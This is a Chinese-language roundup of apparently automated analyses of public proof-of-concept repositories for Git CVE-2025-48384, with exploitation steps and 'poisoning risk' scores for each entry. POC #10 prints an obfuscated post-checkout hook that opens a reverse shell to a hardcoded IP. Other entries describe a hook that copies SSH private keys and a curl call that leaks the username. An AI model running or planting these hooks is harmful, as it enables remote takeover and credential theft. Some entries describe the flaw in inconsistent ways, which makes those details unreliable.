根据搜索结果和POC代码，这个漏洞与`.gitmodules`文件的处理方式有关。攻击者可以在`.gitmodules`文件中嵌入恶意配置，当用户克隆包含这个文件的仓库时，Git客户端会解析这个文件，并执行其中的恶意操作。POC代码`post-checkout`中包含一个`curl`命令，该命令尝试向一个外部服务器发送包含用户名的请求，证明POC可以执行恶意命令。POC代码中包含了一个简单的利用场景，即在`post-checkout`脚本中执行curl命令，但这只是一个概念验证，攻击者可以利用这个漏洞执行更复杂的操作，例如写入恶意文件、修改系统配置等。 通过分析 liamg/CVE-2025-48384 项目，该项目提供了 PoC，表明该漏洞确实存在且可被利用，进一步验证了该漏洞的有效性。结合Arctic Wolf的报告，该漏洞的严重性被确认为高危，需要及时修复。

利用步骤：
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将这个仓库托管到一个公开的Git服务器上，或者通过其他方式诱使用户克隆这个仓库。
3. 用户克隆这个仓库。
4. Git客户端解析`.gitmodules`文件，并执行其中的恶意操作。
5. 恶意文件被写入到用户的文件系统中，或者其他恶意操作被执行。

投毒风险分析：
这个POC的投毒风险属于中等。虽然POC代码本身比较简单，只包含一个curl命令，但是攻击者可以很容易地将这个POC扩展到更复杂的攻击场景。例如，攻击者可以在`.gitmodules`文件中嵌入更复杂的脚本，或者利用这个漏洞下载并执行恶意文件。另外，由于这个漏洞涉及到Git客户端的解析过程，攻击者还可以利用这个漏洞绕过一些安全防护机制。在这个特定的POC中，存在一个对外部URL的curl请求。虽然这个请求本身并不一定是恶意的，但它可能会泄露用户信息，或者被用于恶意目的。如果这个请求的目标服务器被攻击者控制，那么攻击者就可以利用这个请求来执行更复杂的攻击。
此外，由于POC发布在公共代码托管平台，存在被恶意修改的风险，例如植入后门、添加恶意依赖等。用户在使用POC时需要仔细审查代码，确保其安全性。
综合考虑，这个POC的投毒风险为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-483


---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待确定，参考GitHub advisory

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是一个影响Git的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当受害者克隆这个仓库时，恶意配置会导致任意文件写入。根据搜索结果，该漏洞存在于Git的 submodule 处理过程中，攻击者可以利用包含恶意.gitmodules文件的仓库，在受害者克隆仓库时执行恶意操作。

POC有效性分析：
根据提供的搜索结果和POC代码库（liamg/CVE-2025-48384），该漏洞具有较高的可利用性。POC代码库提供了可执行的PoC，证明该漏洞确实存在。通过精心构造的.gitmodules文件，攻击者可以控制git submodule的配置，导致任意文件写入。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱使受害者克隆该仓库（例如，通过社交工程或将其托管在公共代码托管平台上）。
3. 当受害者执行git clone --recurse-submodules或git submodule update命令时，Git会解析.gitmodules文件，并执行其中包含的恶意配置。
4. 恶意配置可能导致在受害者系统上写入任意文件，从而实现远程代码执行或其他恶意行为。

投毒风险分析：
此漏洞本身主要依赖于恶意仓库的传播和社会工程，直接的投毒风险较低。但是，如果攻击者修改现有的流行仓库，并引入包含漏洞利用的submodule，则可能造成大规模的攻击。该漏洞的PoC代码主要利用Git的特性，没有发现明显的混淆或恶意行为，因此投毒风险较低。

具体来说，投毒风险主要体现在以下几个方面：
1.  **恶意submodule注入：** 攻击者可以尝试向流行的开源项目中注入包含漏洞利用代码的submodule。如果项目维护者不小心合并了这些恶意更改，就会导致所有克隆该项目的用户受到攻击。
2.  **.gitmodules文件伪造：** 攻击者可以创建与知名项目结构相似的仓库，并使用相似的.gitmodules文件，诱导用户克隆错误的仓库。
3.  **供应链攻击：** 如果某个软件项目依赖于受漏洞影响的Git仓库，攻击者可以通过修改该依赖项，从而影响整个软件供应链。

考虑到该漏洞的利用方式主要依赖于社会工程和恶意仓库的传播，且PoC代码本身较为清晰，因此初步评估该漏洞的投毒风险为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆这些仓库时，可能导致任意文件写入。漏洞源于 Git 在处理 submodule 时，没有充分验证 `.gitmodules` 文件中的路径。攻击者可以利用这一点，在 `.gitmodules` 文件中指定恶意的路径，从而在克隆仓库时写入任意文件。

**POC有效性分析：**
从搜索结果中的 GitHub 链接（liamg/CVE-2025-48384）可以判断存在公开的POC代码。该POC的描述是“PoC for CVE-2025-48384”。结果2提及了“漏洞 POC 深度解析:从代码到攻击链的完整拆解”，说明该漏洞已被深入研究，并且存在可用的攻击链。结果6提及了“Breaking Git with a carriage return and cloning RCE”，表明漏洞利用可能涉及某种形式的远程代码执行。根据搜索结果4、5的内容，可以确定该POC已在GitHub上公开，可下载和测试。文件`README.md`确认了该POC的存在，尽管内容简单。综合来看，该POC的有效性较高，可以成功触发任意文件写入漏洞。

**利用步骤：**
1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件中的路径被设置为指向攻击者希望写入的任意文件位置。
3. 攻击者将恶意仓库托管在公共或私有 Git 服务器上。
4. 受害者克隆该恶意仓库。在克隆过程中，Git 会尝试初始化 submodule，并根据 `.gitmodules` 文件中的指示写入文件。
5. 由于路径验证不足，恶意文件将被写入受害者文件系统的指定位置。

**投毒风险分析：**
由于该漏洞涉及任意文件写入，攻击者可以通过写入恶意文件来达到投毒目的。例如，攻击者可以写入一个包含恶意代码的可执行文件，或者修改系统配置文件以劫持系统行为。虽然该漏洞本身不直接执行代码，但通过文件写入可以为后续的代码执行创造条件。从POC代码`/tmp/vulnwatchdog_8746716955bead91920f029f2728e38d/README.md`中，没有发现任何可疑行为，只包含简单的readme信息，因此投毒风险较低。但是，不能排除攻击者在其他利用方式中，使用复杂的投毒手法。因此，需要分析通过文件写入进行投毒的可能性。攻击者可能尝试写入如下文件：
* `.bashrc` 或 `.zshrc`：在用户shell启动时执行恶意代码。
* `/etc/profile.d/` 中的脚本：在系统启动时执行恶意代码。
* SSH authorized_keys：添加公钥，实现免密登录。
* Web服务器配置文件：修改配置，执行恶意脚本。
这些攻击场景都需要精心构造恶意内容，并且依赖于目标系统的特定配置。由于需要进行精细构造，并且受限于目标环境，判定该漏洞的投毒风险为低，约为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

